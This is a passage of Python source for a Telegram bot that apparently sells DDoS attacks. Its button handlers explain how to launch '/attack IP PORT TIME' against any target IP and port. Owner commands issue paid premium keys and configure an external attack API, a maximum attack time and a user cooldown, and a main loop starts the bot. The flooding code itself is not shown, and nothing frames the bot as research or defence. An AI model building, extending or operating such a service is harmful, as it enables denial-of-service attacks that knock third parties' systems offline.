        "╔══════════════════════════════╗\n"
        "║   ⚙️ 𝗔𝗟𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ⚙️   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   👑 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
        "┣ /users ➪ ᴜꜱᴇʀꜱ ʟɪꜱᴛ\n"
        "┣ /stats ➪ ʙᴏᴛ ꜱᴛᴀᴛꜱ\n"
        "┣ /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
        "┣ /ban ID REASON ➪ ʙᴀɴ ᴜꜱᴇʀ\n"
        "┗ /unban ID ➪ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🔑 𝗞𝗘𝗬 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ /genkey 1d 5 ➪ 5 ᴋᴇʏꜱ 1 ᴅᴀʏ\n"
        "┣ /genkey 1month 10 VIP ➪ ᴘʀᴇᴍɪᴜᴍ\n"
        "┗ /redeem KEY ➪ ʀᴇᴅᴇᴇᴍ ᴋᴇʏ\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   📡 𝗔𝗣𝗜 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ /setapi URL TOKEN\n"
        "┣ /testapi\n"
        "┣ /setmaxtime SEC\n"
        "┗ /setcooldown SEC\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🔧 𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ /maintenance ➪ ᴛᴏɢɢʟᴇ\n"
        "┗ /status ➪ ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ ꜱᴇɴᴅ ꜱᴛɪᴄᴋᴇʀ ➪ ᴀᴅᴅ\n"
        "┣ /removesticker NUM\n"
        "┗ /liststickers\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   📹 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ➪ ᴀᴅᴅ\n"
        "┣ /listvideo\n"
        "┗ /delvideo NUM\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "┣ /addpyf ➪ ᴀᴅᴅ ᴘʏꜰ\n"
        "┣ /listpyf ➪ ʟɪꜱᴛ\n"
        "┗ /delpyf NUM ➪ ᴅᴇʟᴇᴛᴇ\n\n"
        "╔══════════════════════════════╗\n"
        "║   💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 💎   ║\n"
        "╚══════════════════════════════╝"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

# ============= BUTTONS =============
@bot.message_handler(func=lambda m: m.text == "🔥 𝐀𝐓𝐓𝐀𝐂𝐊")
def btn_attack(msg):
    if check_ban(msg): return
    bot.reply_to(msg,
        "╔══════════════════════════╗\n"
        "║   🎯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🎯   ║\n"
        "╚══════════════════════════╝\n\n"
        "📌 <b>ᴜꜱᴀɢᴇ:</b>\n"
        "<code>/attack IP PORT TIME</code>\n\n"
        "📝 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
        "<code>/attack 1.2.3.4 80 60</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🎯 <b>ɪᴘ:</b> ᴛᴀʀɢᴇᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ\n"
        "🔌 <b>ᴘᴏʀᴛ:</b> ᴛᴀʀɢᴇᴛ ᴘᴏʀᴛ (1-65535)\n"
        "⏱️ <b>ᴛɪᴍᴇ:</b> ᴛɪᴍᴇ ɪɴ ꜱᴇᴄᴏɴᴅꜱ\n"
        "━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
def btn_status(msg): cmd_status(msg)

@bot.message_handler(func=lambda m: m.text == "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
def btn_profile(msg): cmd_profile(msg)

@bot.message_handler(func=lambda m: m.text == "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
def btn_owner(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ!</b>", parse_mode="HTML")
        return
    bot.reply_to(msg, "👑 <b>ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ</b>", reply_markup=kb_owner(), parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 𝐑𝐄𝐃𝐄𝐄𝐌")
def btn_redeem(msg):
    if check_ban(msg): return
    bot.reply_to(msg,
        "╔══════════════════════════════╗\n"
        "║   🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🔑   ║\n"
        "╚══════════════════════════════╝\n\n"
        "📝 <b>ᴜꜱᴀɢᴇ:</b>\n"
        "<code>/redeem YOUR-KEY</code>\n\n"
        "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
        "<code>/redeem VIP-A1B2-C3D4-E5F6</code>",
        parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "🔑 𝐆𝐄𝐍 𝐊𝐄𝐘")
def btn_genkey(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ!</b>", parse_mode="HTML")
        return
    txt = (
        "╔══════════════════════════════╗\n"
        "║   🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🔑   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   💎 𝗚𝗘𝗡𝗞𝗘𝗬 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💎\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "📝 <b>ꜰᴏʀᴍᴀᴛ:</b>\n"
        "<code>/genkey DURATION [AMOUNT] [NAME]</code>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ⏰ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗢𝗣𝗧𝗜𝗢𝗡𝗦\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "⚡ <b>ꜱᴇᴄᴏɴᴅꜱ</b>  ➪  <code>10s</code>  <code>60s</code>\n"
        "⏱️ <b>ᴍɪɴᴜᴛᴇꜱ</b>  ➪  <code>30m</code>  <code>45m</code>\n"
        "🕐 <b>ʜᴏᴜʀꜱ</b>     ➪  <code>1h</code>  <code>12h</code>\n"
        "📅 <b>ᴅᴀʏꜱ</b>      ➪  <code>1d</code>  <code>7d</code>  <code>30d</code>\n"
        "🗓️ <b>ᴡᴇᴇᴋꜱ</b>    ➪  <code>1week</code>\n"
        "🌙 <b>ᴍᴏɴᴛʜꜱ</b>   ➪  <code>1month</code>\n"
        "🎆 <b>ʏᴇᴀʀꜱ</b>     ➪  <code>1year</code>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ✨ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "🔸 <code>/genkey 1d 5</code>\n"
        "🔸 <code>/genkey 1month 10 VIP</code>\n"
        "🔸 <code>/genkey 30m 1 TEST</code>\n\n"
        "╔══════════════════════════════╗\n"
        "║   💠 𝗖𝗨𝗦𝗧𝗢𝗠 𝗡𝗔𝗠𝗘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 💠   ║\n"
        "╚══════════════════════════════╝"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐓𝐀𝐓𝐒")
def btn_stats(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!</b>", parse_mode="HTML")
        return
    cmd_stats(msg)

@bot.message_handler(func=lambda m: m.text == "👥 𝐔𝐒𝐄𝐑𝐒")
def btn_users(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!</b>", parse_mode="HTML")
        return
    cmd_users(msg)

@bot.message_handler(func=lambda m: m.text == "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
def btn_broadcast(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!</b>", parse_mode="HTML")
        return
    txt = (
        "╔══════════════════════════════╗\n"
        "║   📢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📢   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   💎 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💎\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "📝 <b>ꜰᴏʀᴍᴀᴛ:</b>\n"
        "<code>/broadcast YOUR MESSAGE</code>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ✨ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "🔸 <code>/broadcast Bot update ho gaya!</code>\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   📊 𝗜𝗡𝗙𝗢 📊\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"👥 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> <code>{len(data['users'])}</code>\n"
        f"🚫 <b>ʙᴀɴɴᴇᴅ:</b> <code>{len(data.get('banned_users', {}))}</code>\n\n"
        "╔══════════════════════════════╗\n"
        "║   💠 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 💠   ║\n"
        "╚══════════════════════════════╝"
    )
    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == "⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒")
def btn_settings(msg):
    if not is_owner(msg.from_user.id):
        bot.reply_to(msg, "🚫 <b>ᴏᴡɴᴇʀ ᴏɴʟʏ ᴄᴏᴍᴍᴀɴᴅ!</b>", parse_mode="HTML")
        return
    cmd_settings(msg)

@bot.message_handler(func=lambda m: m.text == "❌ 𝐂𝐋𝐎𝐒𝐄")
def btn_close(msg):
    bot.reply_to(msg, "❌ <b>ᴄʟᴏꜱᴇᴅ.</b>", reply_markup=kb_main(msg.from_user.id), parse_mode="HTML")

# ============= FALLBACK FOR BANNED USERS =============
@bot.message_handler(func=lambda m: is_banned(m.from_user.id), content_types=['text'])
def banned_fallback(msg):
    check_ban(msg)

# ============= MAIN =============
print("=" * 55)
print(f"  {BOT_NAME}")
print("=" * 55)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  📡 API URL: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"  🔑 API Token: {get_setting('api_token', DEFAULT_API_TOKEN)[:20]}...")
print(f"  🎯 Method: {get_setting('api_method', DEFAULT_API_METHOD)}")
print(f"  🌍 Geo: {get_setting('api_geolocation', DEFAULT_API_GEOLOCATION)}")
print(f"  ⏱️ Max Time: {get_setting('max_attack_time', 300)}s")
print(f"  ⏸️ Cooldown: {get_setting('user_cooldown', 5)}s")
print("=" * 55)
print("  ✅ Bot running...")
print("=" * 55)

while True:
    try:
        bot.remove_webhook()
        time.sleep(0.5)
        bot.polling(
            none_stop=True,
            interval=0,
            timeout=20,
            long_polling_timeout=15,
            allowed_updates=["message", "edited_message", "callback_query"]
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
        break
    except Exception as e:
        print(f"⚠️ Polling Error: {e}")
        time.sleep(3)
